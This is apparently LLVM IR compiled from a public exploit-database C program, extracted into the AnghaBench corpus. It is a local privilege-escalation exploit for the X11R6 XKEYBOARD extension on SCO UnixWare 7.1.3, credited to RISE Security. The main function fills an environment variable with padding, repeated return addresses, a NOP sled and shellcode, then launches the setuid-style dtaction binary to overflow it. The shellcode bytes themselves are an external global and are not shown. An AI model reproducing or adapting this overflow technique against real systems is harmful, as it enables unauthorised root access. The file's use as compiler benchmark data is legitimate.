; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_2332.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_2332.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [63 x i8] c"X11R6 XKEYBOARD extension Strcmp() for SCO UnixWare 7.1.3 x86\0A\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"Copyright 2006 RISE Security <contact@risesecurity.org>\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"usage: %s xserver:display\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"_XKB_CHARSET=\00", align 1
@ADRSIZE = common dso_local global i32 0, align 4
@NOPSIZE = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [21 x i8] c"/usr/dt/bin/dtaction\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"dtaction\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [8192 x i8], align 16
  %7 = alloca [256 x i8], align 16
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8*], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 2
  br i1 %15, label %16, label %24

16:                                               ; preds = %2
  %17 = load i32, i32* @stderr, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = load i32, i32* @EXIT_FAILURE, align 4
  %23 = call i32 @exit(i32 %22) #3
  unreachable

24:                                               ; preds = %2
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @snprintf(i8* %25, i32 256, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i8* %28)
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %31 = ptrtoint i8* %30 to i32
  %32 = add i32 %31, 2048
  %33 = add i32 %32, 256
  %34 = add i32 %33, 1024
  %35 = add i32 %34, 2048
  %36 = add i32 %35, 1
  %37 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %38 = bitcast i8* %37 to i32*
  store i32 %36, i32* %38, align 1
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  store i8* %39, i8** %10, align 8
  %40 = load i8*, i8** %10, align 8
  %41 = call i32 @sprintf(i8* %40, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %43 = getelementptr inbounds i8, i8* %42, i64 13
  store i8* %43, i8** %10, align 8
  store i32 0, i32* %11, align 4
  br label %44

44:                                               ; preds = %50, %24
  %45 = load i32, i32* %11, align 4
  %46 = icmp slt i32 %45, 256
  br i1 %46, label %47, label %53

47:                                               ; preds = %44
  %48 = load i8*, i8** %10, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %10, align 8
  store i8 65, i8* %48, align 1
  br label %50

50:                                               ; preds = %47
  %51 = load i32, i32* %11, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %11, align 4
  br label %44

53:                                               ; preds = %44
  store i32 0, i32* %11, align 4
  br label %54

54:                                               ; preds = %66, %53
  %55 = load i32, i32* %11, align 4
  %56 = load i32, i32* @ADRSIZE, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %69

58:                                               ; preds = %54
  %59 = load i32, i32* %11, align 4
  %60 = srem i32 %59, 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = load i8*, i8** %10, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %10, align 8
  store i8 %63, i8* %64, align 1
  br label %66

66:                                               ; preds = %58
  %67 = load i32, i32* %11, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %11, align 4
  br label %54

69:                                               ; preds = %54
  store i32 0, i32* %11, align 4
  br label %70

70:                                               ; preds = %77, %69
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* @NOPSIZE, align 4
  %73 = icmp slt i32 %71, %72
  br i1 %73, label %74, label %80

74:                                               ; preds = %70
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %10, align 8
  store i8 -112, i8* %75, align 1
  br label %77

77:                                               ; preds = %74
  %78 = load i32, i32* %11, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %11, align 4
  br label %70

80:                                               ; preds = %70
  store i32 0, i32* %11, align 4
  br label %81

81:                                               ; preds = %95, %80
  %82 = load i32, i32* %11, align 4
  %83 = load i32*, i32** @shellcode, align 8
  %84 = call i32 @strlen(i32* %83)
  %85 = icmp slt i32 %82, %84
  br i1 %85, label %86, label %98

86:                                               ; preds = %81
  %87 = load i32*, i32** @shellcode, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  %91 = load i32, i32* %90, align 4
  %92 = trunc i32 %91 to i8
  %93 = load i8*, i8** %10, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 1
  store i8* %94, i8** %10, align 8
  store i8 %92, i8* %93, align 1
  br label %95

95:                                               ; preds = %86
  %96 = load i32, i32* %11, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %11, align 4
  br label %81

98:                                               ; preds = %81
  %99 = load i8*, i8** %10, align 8
  store i8 0, i8* %99, align 1
  %100 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %101 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  store i8* %100, i8** %101, align 16
  %102 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %103 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 1
  store i8* %102, i8** %103, align 8
  %104 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 2
  store i8* null, i8** %104, align 16
  %105 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  %106 = call i32 @execle(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i32 0, i8** %105)
  %107 = load i32, i32* @EXIT_FAILURE, align 4
  %108 = call i32 @exit(i32 %107) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
